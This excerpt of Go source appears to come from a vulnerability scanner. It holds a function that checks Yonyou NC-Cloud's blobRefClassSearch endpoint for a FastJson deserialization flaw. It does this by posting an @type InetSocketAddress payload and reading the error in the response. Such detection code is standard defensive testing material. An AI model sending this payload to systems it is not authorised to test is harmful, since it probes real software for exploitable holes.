...
func BlobRefClassSearchScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	GetDecAllUsers := "用友 NC-Cloud blobRefClassSearch FastJson反序列化漏洞"
	urls := address + "/ncchr/pm/ref/indiIssued/blobRefClassSearch"
	response, err := client.Post(urls, "application/json", strings.NewReader("{\"clientParam\":\"{\\\"x\\\":{\\\"@type\\\":\\\"java.net.InetSocketAddress\\\"{\\\"address\\\":,\\\"val\\\":\\\"www.baidu.com\\\"}}}\"}"))
	if err != nil {
	...
	if response.StatusCode == http.StatusInternalServerError && strings.Contains(string(body), "NullPointerException") || strings.Contains(string(body), "\"class\":") {
